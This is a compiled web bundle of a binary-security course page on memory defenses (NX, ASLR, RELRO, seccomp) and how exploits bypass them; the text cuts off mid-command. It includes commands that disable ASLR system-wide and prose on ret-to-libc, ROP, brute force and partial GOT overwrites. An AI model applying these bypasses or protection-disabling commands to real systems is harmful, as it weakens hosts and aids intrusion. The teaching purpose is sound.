"use strict";(self.webpackChunkbinary_security=self.webpackChunkbinary_security||[]).push([[1023],{5680:(e,n,a)=>{a.d(n,{xA:()=>d,yg:()=>h});var t=a(6540);function i(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function r(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,t)}return a}function o(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?r(Object(a),!0).forEach((function(n){i(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):r(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function s(e,n){if(null==e)return{};var a,t,i=function(e,n){if(null==e)return{};var a,t,i={},r=Object.keys(e);for(t=0;t<r.length;t++)a=r[t],n.indexOf(a)>=0||(i[a]=e[a]);return i}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(t=0;t<r.length;t++)a=r[t],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(i[a]=e[a])}return i}var l=t.createContext({}),p=function(e){var n=t.useContext(l),a=n;return e&&(a="function"==typeof e?e(n):o(o({},n),e)),a},d=function(e){var n=p(e.components);return t.createElement(l.Provider,{value:n},e.children)},m="mdxType",g={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},c=t.forwardRef((function(e,n){var a=e.components,i=e.mdxType,r=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),m=p(a),c=i,h=m["".concat(l,".").concat(c)]||m[c]||g[c]||r;return a?t.createElement(h,o(o({ref:n},d),{},{components:a})):t.createElement(h,o({ref:n},d))}));function h(e,n){var a=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var r=a.length,o=new Array(r);o[0]=c;var s={};for(var l in n)hasOwnProperty.call(n,l)&&(s[l]=n[l]);s.originalType=e,s[m]="string"==typeof e?e:i,o[1]=s;for(var p=2;p<r;p++)o[p]=a[p];return t.createElement.apply(null,o)}return t.createElement.apply(null,a)}c.displayName="MDXCreateElement"},5953:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>g,frontMatter:()=>r,metadata:()=>s,toc:()=>p});var t=a(8168),i=(a(6540),a(5680));const r={},o="Defense Mechanisms",s={unversionedId:"Mitigation and Defensive Strategies/Defense Mechanisms/Reading/README",id:"Mitigation and Defensive Strategies/Defense Mechanisms/Reading/README",title:"Defense Mechanisms",description:"Introduction",source:"@site/docs/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/README.md",sourceDirName:"Mitigation and Defensive Strategies/Defense Mechanisms/Reading",slug:"/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/",permalink:"/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Defense Mechanisms",permalink:"/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/"},next:{title:"Information Leaks",permalink:"/binary-security/Mitigation and Defensive Strategies/Information Leaks/"}},l={},p=[{value:"Introduction",id:"introduction",level:2},{value:"Tutorials",id:"tutorials",level:2},{value:"General Defense Mechanisms Check",id:"general-defense-mechanisms-check",level:3},{value:"Executable Space Protection",id:"executable-space-protection",level:3},{value:"Memory Segments Permissions Walkthrough",id:"memory-segments-permissions-walkthrough",level:3},{value:"Ways of Bypassing NX",id:"ways-of-bypassing-nx",level:3},{value:"Address Space Layout Randomization",id:"address-space-layout-randomization",level:3},{value:"Ways of Bypassing ASLR",id:"ways-of-bypassing-aslr",level:3},{value:"Chaining Information Leaks with GOT Overwrite",id:"chaining-information-leaks-with-got-overwrite",level:3},{value:"<code>RELRO</code>",id:"relro",level:3},{value:"<code>seccomp</code>",id:"seccomp",level:3},{value:"Challenges",id:"challenges",level:2},{value:"01-04. Challenges - <code>rwslotmachine</code> 1-4",id:"01-04-challenges---rwslotmachine-1-4",level:3},{value:"05. Bonus - <code>rwslotmachine5</code>",id:"05-bonus---rwslotmachine5",level:3},{value:"Further Reading",id:"further-reading",level:2}],d={toc:p},m="wrapper";function g({components:e,...n}){return(0,i.yg)(m,(0,t.A)({},d,n,{components:e,mdxType:"MDXLayout"}),(0,i.yg)("h1",{id:"defense-mechanisms"},"Defense Mechanisms"),(0,i.yg)("h2",{id:"introduction"},"Introduction"),(0,i.yg)("p",null,"The previous sessions (",(0,i.yg)("a",{parentName:"p",href:"../../../Exploitation%20Techniques/Shellcodes/Reading"},"Shellcodes")," and ",(0,i.yg)("a",{parentName:"p",href:"../../../Exploitation%20Techniques/Shellcodes%20Advanced/Reading"},"Shellcodes Advanced"),") presented an exploitation scenario that is based on the assumption that machine instructions can be executed from ",(0,i.yg)("strong",{parentName:"p"},"any")," memory segment belonging to the process.\nAs you can recall from the ",(0,i.yg)("a",{parentName:"p",href:"../../../Binary%20Analysis/Executables%20and%20Processes/Reading"},"Executable File Formats")," session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed.\nThis mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("em",{parentName:"li"},"Executable Space Protection"),": only certain parts of the address space exhibit the code execution right;"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("em",{parentName:"li"},"Address Space Layout Randomization (",(0,i.yg)("inlineCode",{parentName:"em"},"ASLR"),")"),": certain parts of the address space get mapped at random locations.")),(0,i.yg)("p",null,"In the ",(0,i.yg)("a",{parentName:"p",href:"../../../Exploitation%20Techniques/Return-Oriented%20Programming/Reading"},"Return Oriented Programming")," session we discussed how the ",(0,i.yg)("strong",{parentName:"p"},"PLT"),"/",(0,i.yg)("strong",{parentName:"p"},"GOT")," work in relation to resolving addresses of functions from dynamically liked libraries.\nWe also learned how to abuse this process and trigger arbitrary code execution by ",(0,i.yg)("strong",{parentName:"p"},"corrupting GOT entries"),".\nWe will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use."),(0,i.yg)("p",null,"Next, we will introduce the `",(0,i.yg)("inlineCode",{parentName:"p"},"RELRO")," mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT."),(0,i.yg)("p",null,"Another defense mechanism we will discuss is ",(0,i.yg)("inlineCode",{parentName:"p"},"seccomp"),", which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox."),(0,i.yg)("p",null,"Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them.\nSince these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Important:")," The tasks today are designed for 32 bit executables.\nMake sure you compile with the ",(0,i.yg)("inlineCode",{parentName:"p"},"-m32")," flag for ",(0,i.yg)("inlineCode",{parentName:"p"},"gcc"),".\nThe binaries in the tasks archive are already compiled as such."),(0,i.yg)("h2",{id:"tutorials"},"Tutorials"),(0,i.yg)("p",null,"The tutorials will showcase the tools used to inspect the defense mechanisms."),(0,i.yg)("h3",{id:"general-defense-mechanisms-check"},"General Defense Mechanisms Check"),(0,i.yg)("p",null,"The ",(0,i.yg)("inlineCode",{parentName:"p"},"checksec")," command-line tool is a wrapper over the functionality implemented in pwntools' ",(0,i.yg)("inlineCode",{parentName:"p"},"pwnlib.elf.elf")," module."),(0,i.yg)("p",null,"To get it to work in the Kali VM, you have to update pwntools to the latest version using:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"pip3 install -U pwntools\n")),(0,i.yg)("p",null,"We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~/demo/nx# checksec ./no_nx\n[*] '/root/demo/nx/no_nx'\n    Arch:     i386-32-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      PIE enabled\n    RWX:      Has RWX segments\n")),(0,i.yg)("h3",{id:"executable-space-protection"},"Executable Space Protection"),(0,i.yg)("p",null,"The ",(0,i.yg)("inlineCode",{parentName:"p"},"executable space protection")," is an instance of the ",(0,i.yg)("inlineCode",{parentName:"p"},"principle of least privilege"),", which is applied in many security sensitive domains.\nIn this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution.\nA memory region (i.e. page) can have the following protection levels: ",(0,i.yg)("strong",{parentName:"p"},"READ"),", ",(0,i.yg)("strong",{parentName:"p"},"WRITE")," and ",(0,i.yg)("strong",{parentName:"p"},"EXECUTE"),".\nThe executable space protection mechanism mandates that writable regions should not be executable at the same time.\nThis prevents code injection."),(0,i.yg)("p",null,"The mechanism can be (and was) implemented in many different ways, the most common in Linux being:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},(0,i.yg)("inlineCode",{parentName:"strong"},"NX")," bit"),": This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not.\nThis is the current implementation in 64-bit processors where page table entries are 8-bytes wide."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"Physical Address Extension (",(0,i.yg)("inlineCode",{parentName:"strong"},"PAE"),")"),": Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"Emulation"),": The ",(0,i.yg)("inlineCode",{parentName:"li"},"NX")," bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit (",(0,i.yg)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/PaX#PAGEEXEC"},(0,i.yg)("inlineCode",{parentName:"a"},"PaX PAGEEXEC")),"), or by using the segmentation mechanism and splitting the address space in half (",(0,i.yg)("a",{parentName:"li",href:"https://en.wikipedia.org/wiki/PaX#SEGMEXEC"},(0,i.yg)("inlineCode",{parentName:"a"},"PaX SEGMEXEC")),").")),(0,i.yg)("p",null,"This security feature gets in the way of ",(0,i.yg)("strong",{parentName:"p"},"just-in-time (",(0,i.yg)("inlineCode",{parentName:"strong"},"JIT"),")")," compilers, which need to produce and write code at runtime, and that is later executed.\nSince a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as ",(0,i.yg)("strong",{parentName:"p"},"JIT spraying"),".\nThe idea was first presented by Dionysus Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode."),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"Slides: ",(0,i.yg)("a",{parentName:"li",href:"http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf"},"Black Hat & DEF CON 2010"),";"),(0,i.yg)("li",{parentName:"ul"},"Paper: ",(0,i.yg)("a",{parentName:"li",href:"http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf"},"Interpreter Exploitation. Pointer Inference and JIT Spraying"),".")),(0,i.yg)("p",null,"There are of course other implementations in different hardening-oriented projects such as: OpenBSD ",(0,i.yg)("a",{parentName:"p",href:"https://isopenbsdsecu.re/mitigations/wx/"},(0,i.yg)("inlineCode",{parentName:"a"},"W^X")),", Red Hat ",(0,i.yg)("a",{parentName:"p",href:"https://www.redhat.com/en/blog/security-technologies-execshield"},(0,i.yg)("inlineCode",{parentName:"a"},"Exec Shield")),", ",(0,i.yg)("inlineCode",{parentName:"p"},"PaX")," (which is now part of ",(0,i.yg)("a",{parentName:"p",href:"https://grsecurity.net/"},(0,i.yg)("inlineCode",{parentName:"a"},"grsecurity")),"), Windows Data Execution Prevention (",(0,i.yg)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention"},(0,i.yg)("inlineCode",{parentName:"a"},"DEP")),")."),(0,i.yg)("h3",{id:"memory-segments-permissions-walkthrough"},"Memory Segments Permissions Walkthrough"),(0,i.yg)("p",null,"The Linux kernel provides support for managing memory protections using the ",(0,i.yg)("inlineCode",{parentName:"p"},"mmap()")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"mprotect()")," syscalls.\nSimply put, what they do is:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"mmap()"),": requests the OS to create a mapping (allocate space) inside the address space of the calling process.\nSee ",(0,i.yg)("a",{parentName:"li",href:"https://stackoverflow.com/questions/3642021/what-does-mmap-do"},"this answer"),";"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"mprotect()"),": requests the OS to set permissions over a memory region (e.g. ",(0,i.yg)("inlineCode",{parentName:"li"},"PROT_READ"),", ",(0,i.yg)("inlineCode",{parentName:"li"},"PROT_WRITE"),", ",(0,i.yg)("inlineCode",{parentName:"li"},"PROT_EXEC")," and others).")),(0,i.yg)("p",null,"These syscalls are used by the loader to set protection levels for each segment it loads when running a binary.\nOf course, the same functions can also be used during execution."),(0,i.yg)("p",null,"PaX has a protection option that restricts the use of ",(0,i.yg)("inlineCode",{parentName:"p"},"mprotect()")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"mmap()")," to avoid resetting the permissions during execution.\nSee ",(0,i.yg)("a",{parentName:"p",href:"https://pax.grsecurity.net/docs/mprotect.txt"},(0,i.yg)("inlineCode",{parentName:"a"},"MPROTECT")),".\nNote that ",(0,i.yg)("inlineCode",{parentName:"p"},"grsecurity")," / ",(0,i.yg)("inlineCode",{parentName:"p"},"PaX")," are patches to the kernel, and are not available in normal distributions.\nYou have to compile your own kernel if you want to try them out."),(0,i.yg)("p",null,"Let's start by deactivating ",(0,i.yg)("inlineCode",{parentName:"p"},"ASLR"),", which is going to be discussed in the following section of this tutorial, and only focus on the NX protection.\nWe can do this in two ways, as told below."),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},"To disable ASLR system-wide we use (root access is required):"),(0,i.yg)("pre",{parentName:"li"},(0,i.yg)("code",{parentName:"pre",className:"language-console"},"sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'\n"))),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},"To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required):"),(0,i.yg)("pre",{parentName:"li"},(0,i.yg)("code",{parentName:"pre",className:"language-console"},"setarch $(uname -m) -R /bin/bash\n")))),(0,i.yg)("p",null,"After disabling ASLR, let's compile an extremely simple C application.\nSave the following code as ",(0,i.yg)("inlineCode",{parentName:"p"},"hello.c"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},"int main() {\n    while (1);\n}\n")),(0,i.yg)("p",null,"Make sure you have both ",(0,i.yg)("inlineCode",{parentName:"p"},"build-essential")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"gcc-multilib")," packages installed before going further (run ",(0,i.yg)("inlineCode",{parentName:"p"},"sudo apt install build-essential gcc-multilib")," on Debian-based systems)."),(0,i.yg)("p",null,"Compile the ",(0,i.yg)("inlineCode",{parentName:"p"},"hello.c")," code using:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"CFLAGS='-m32 -O0' make hello\n")),(0,i.yg)("p",null,"The result should be a ",(0,i.yg)("inlineCode",{parentName:"p"},"hello")," binary."),(0,i.yg)("p",null,"As presented in the ",(0,i.yg)("a",{parentName:"p",href:"../../../Binary%20Analysis/Static%20Analysis/Reading"},'"Static Analysis" session'),", the ELF format contains flags for each segment that specify what permissions should be granted.\nYou can use ",(0,i.yg)("inlineCode",{parentName:"p"},"readelf -l hello")," to dump all program headers for this binary.\nThe result should be similar to:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"Program Headers:\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4\n  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1\n      [Requesting program interpreter: /lib/ld-linux.so.2]\n  LOAD           0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000\n  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000\n  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4\n  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4\n  GNU_EH_FRAME   0x000490 0x08048490 0x08048490 0x0002c 0x0002c R   0x4\n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10\n  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1\n\n Section to Segment mapping:\n  Segment Sections...\n   00\n   01     .interp\n   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame\n   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss\n   04     .dynamic\n   05     .note.ABI-tag .note.gnu.build-id\n   06     .eh_frame_hdr\n   07\n   08     .init_array .fini_array .jcr .dynamic .got\n")),(0,i.yg)("p",null,"Check the ",(0,i.yg)("inlineCode",{parentName:"p"},"Flg")," column.\nFor example, the first ",(0,i.yg)("inlineCode",{parentName:"p"},"LOAD")," segment contains ",(0,i.yg)("inlineCode",{parentName:"p"},".text")," and is marked ",(0,i.yg)("inlineCode",{parentName:"p"},"R E"),", while the ",(0,i.yg)("inlineCode",{parentName:"p"},"GNU_STACK")," segment is marked ",(0,i.yg)("inlineCode",{parentName:"p"},"RW"),"."),(0,i.yg)("p",null,"Next we are interested in seeing calls to ",(0,i.yg)("inlineCode",{parentName:"p"},"mmap2()")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"mprotect()")," made by the loader.\nWe are going to use the ",(0,i.yg)("inlineCode",{parentName:"p"},"strace")," tool for this, and directly execute the loader.\nYou can check the path to the loader on your system using ",(0,i.yg)("inlineCode",{parentName:"p"},"ldd hello"),"."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"strace -e mmap2,mprotect /lib/ld-linux.so.2 ./hello\n")),(0,i.yg)("p",null,"The output should be similar to:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"[ Process PID=11198 runs in 32 bit mode. ]\nmmap2(0x8048000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8048000\nmmap2(0x8049000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x8049000\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffc000\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7ffa000\nmmap2(NULL, 156324, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffffffff7fd3000\nmmap2(NULL, 1763964, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffffffff7e24000\nmmap2(0xf7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a9000) = 0xfffffffff7fcd000\nmmap2(0xf7fd0000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7fd0000\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7e23000\nmprotect(0xf7fcd000, 8192, PROT_READ)   = 0\nmprotect(0x8049000, 4096, PROT_READ)    = 0\nmprotect(0x56575000, 4096, PROT_READ)   = 0\n")),(0,i.yg)("p",null,"We can observe a ",(0,i.yg)("inlineCode",{parentName:"p"},"PROT_READ|PROT_EXEC")," mapping at address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x8048000"),", followed by a ",(0,i.yg)("inlineCode",{parentName:"p"},"PROT_READ|PROT_WRITE")," at address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x8049000")," that is later changed to ",(0,i.yg)("inlineCode",{parentName:"p"},"PROT_READ")," for the first half (4096 bytes).\nThe later allocation is the data segment, that should be writable.\nWe can also see a bunch of allocations for segments belonging to dynamic libraries."),(0,i.yg)("p",null,"Note that the ",(0,i.yg)("strong",{parentName:"p"},"stack")," is not explicitly allocated by the loader.\nThe kernel will keep increasing it each time a page fault is triggered without calling ",(0,i.yg)("inlineCode",{parentName:"p"},"mmap"),".\nAlso, the ",(0,i.yg)("strong",{parentName:"p"},"heap")," will be extended on-demand as the application requires it."),(0,i.yg)("p",null,"We can dump all memory mappings of the running process as follows:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ ps u | grep /lib/ld-linux.so.2\n... # get the PID of the loader process from this output, let's assume it is 11198\n\n$ cat /proc/11198/maps\n")),(0,i.yg)("p",null,"Make sure to use the PID of the loader process, and not the ",(0,i.yg)("inlineCode",{parentName:"p"},"strace")," process."),(0,i.yg)("p",null,"The output of the last ",(0,i.yg)("inlineCode",{parentName:"p"},"cat")," command should be similar to:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"08048000-08049000 r-xp 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello\n08049000-0804a000 r--p 00000000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello\n0804a000-0804b000 rw-p 00001000 00:22 5769082                            /home/sss-user/sss-binary/sessions/defense-mechanisms/activities/hello\n56555000-56575000 r-xp 00000000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so\n56575000-56576000 r--p 0001f000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so\n56576000-56577000 rw-p 00020000 08:05 827365                             /lib/i386-linux-gnu/ld-2.19.so\nf7e23000-f7e24000 rw-p 00000000 00:00 0\nf7e24000-f7fcd000 r-xp 00000000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so\nf7fcd000-f7fcf000 r--p 001a9000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so\nf7fcf000-f7fd0000 rw-p 001ab000 08:05 823395                             /lib/i386-linux-gnu/libc-2.19.so\nf7fd0000-f7fd3000 rw-p 00000000 00:00 0\nf7ffa000-f7ffd000 rw-p 00000000 00:00 0\nf7ffd000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]\nfffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]\n")),(0,i.yg)("h3",{id:"ways-of-bypassing-nx"},"Ways of Bypassing NX"),(0,i.yg)("p",null,"Below are a few methods of exploiting a binary that has ",(0,i.yg)("strong",{parentName:"p"},"NX")," enabled:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"ret-to-plt/libc"),":\nYou can return to the ",(0,i.yg)("inlineCode",{parentName:"li"},".plt")," section and call library function already linked.\nYou can also call other library functions based on their known offsets.\nThe latter approach assumes no ASLR (see next section), or the possibility of an information leak."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"mprotect()"),":\nIf the application is using ",(0,i.yg)("inlineCode",{parentName:"li"},"mprotect()")," you can easily call it to modify the permissions and include ",(0,i.yg)("inlineCode",{parentName:"li"},"PROT_EXEC")," for the stack.\nYou can also call this in a ",(0,i.yg)("inlineCode",{parentName:"li"},"ret-to-libc")," attack.\nYou can also ",(0,i.yg)("inlineCode",{parentName:"li"},"mmap")," a completely new memory region and dump the shellcode there."),(0,i.yg)("li",{parentName:"ul"},"Return Oriented Programming (",(0,i.yg)("inlineCode",{parentName:"li"},"ROP"),"):\nThis is a generalization of the ",(0,i.yg)("inlineCode",{parentName:"li"},"ret-to-*")," approach that makes use of existing code to execute almost anything.\nAs this is probably one of the most common types of attacks, it will be discussed in depth in a future section.")),(0,i.yg)("h3",{id:"address-space-layout-randomization"},"Address Space Layout Randomization"),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Address Space Layout Randomization (",(0,i.yg)("inlineCode",{parentName:"strong"},"ASLR"),")")," is a security feature that maps different memory regions of an executable at random addresses.\nThis prevents buffer overflow-based attacks that rely on known addresses such as the stack (for calling into shellcode), or dynamically linked libraries (for calling functions that were not already linked with the target binary).\nUsually, the sections that are randomly mapped are: the stack, the heap, the VDSO page, and the dynamic libraries.\nThe code section can also be randomly mapped for ",(0,i.yg)("a",{parentName:"p",href:"https://en.wikipedia.org/wiki/Position-independent_code#PIE"},(0,i.yg)("inlineCode",{parentName:"a"},"PIE"))," binaries."),(0,i.yg)("p",null,"Linux allows 3 options for its ASLR implementation that can be configured using the ",(0,i.yg)("inlineCode",{parentName:"p"},"/proc/sys/kernel/randomize_va_space")," file.\nWriting ",(0,i.yg)("strong",{parentName:"p"},"0"),", ",(0,i.yg)("strong",{parentName:"p"},"1")," or ",(0,i.yg)("strong",{parentName:"p"},"2")," to this will results in the following behaviors:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"0"),": deactivated;"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"1"),": random stack, vdso, libraries;\nheap is after code section;\nrandom code section (only for PIE-linked binaries);"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("strong",{parentName:"li"},"2"),": random heap too.")),(0,i.yg)("p",null,"Make sure you reactivate ASLR after the previous section of the tutorial, by one of the two options below."),(0,i.yg)("p",null,"If you disabled ASLR system-wide, re-enable it using (root access is required):"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'\n")),(0,i.yg)("p",null,"If you disabled ASLR at shell level, simply ",(0,i.yg)("strong",{parentName:"p"},"close the shell")," such as issuing the ",(0,i.yg)("inlineCode",{parentName:"p"},"Ctrl+d")," keyboard shortcut."),(0,i.yg)("p",null,"We can easily demonstrate the effects of ASLR on shared libraries by running ",(0,i.yg)("inlineCode",{parentName:"p"},"ldd")," multiple times in a row on a binary such as ",(0,i.yg)("inlineCode",{parentName:"p"},"/bin/ls"),"."),(0,i.yg)("p",null,"In GDB, ASLR is disabled by default in order to reduce the non-determinism and make debugging easier.\nHowever, when developing exploits we will sometimes want to test them in conjunction with ASLR.\nTo enable ASLR in GDB, use the following command:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-text"},"pwndbg> set disable-randomization off\n")),(0,i.yg)("h3",{id:"ways-of-bypassing-aslr"},"Ways of Bypassing ASLR"),(0,i.yg)("p",null,"Below are a few methods of exploiting a binary that has ",(0,i.yg)("strong",{parentName:"p"},"ASLR")," enabled:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},"Brute force"),":\nIf you are able to inject payloads multiple times without crashing the application, you can brute-force the address you are interested in (e.g., a target in libc).\nOtherwise, you can just run the exploit multiple times.\nAnother thing to keep in mind is that, as addresses are randomized at load-time, child processes spawned with fork inherit the memory layout of the parent.\nTake the following scenario: we interact with a vulnerable sever that handles connections by forking to another process.\nWe manage to obtain a leak from a child process but we are not able to create an exploit chain that leads to arbitrary code execution.\nHowever, we may still be able to use this leak in another connection, since the new process will have the same address space as the previous.")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},"NOP sled"),":\nIn the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized.\nThis is not very useful when we are interested in jumping to libc or other functions, which is usually the case if the executable space protection is also active.")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},(0,i.yg)("inlineCode",{parentName:"strong"},"jmp esp")),":\nThis will basically jump into the stack, no matter where it is mapped.\nIt's actually a very rudimentary form of Return Oriented Programming which was discussed in the previous session.")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},"Restrict entropy"),":\nThere are various ways of reducing the entropy of the randomized address.\nFor example, you can decrease the initial stack size by setting a huge amount of dummy environment variables.")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("strong",{parentName:"p"},"Partial overwrite"),":\nThis technique is useful when we are able to overwrite only the least significant byte(s) of an address (e.g. a GOT entry).\nWe must take into account the offsets of the original and final addresses from the beginning of the mapping.\nIf these offsets only differ in the last 8 bits, the exploit is deterministic, as the base of the mapping is aligned to 0x1000.\nThe offsets of ",(0,i.yg)("inlineCode",{parentName:"p"},"read")," and ",(0,i.yg)("inlineCode",{parentName:"p"},"write")," in ",(0,i.yg)("inlineCode",{parentName:"p"},"libc6_2.27-3ubuntu1.2_i386")," are suitable for a partial overwrite:"),(0,i.yg)("pre",{parentName:"li"},(0,i.yg)("code",{parentName:"pre",className:"language-console"},"pwndbg> p 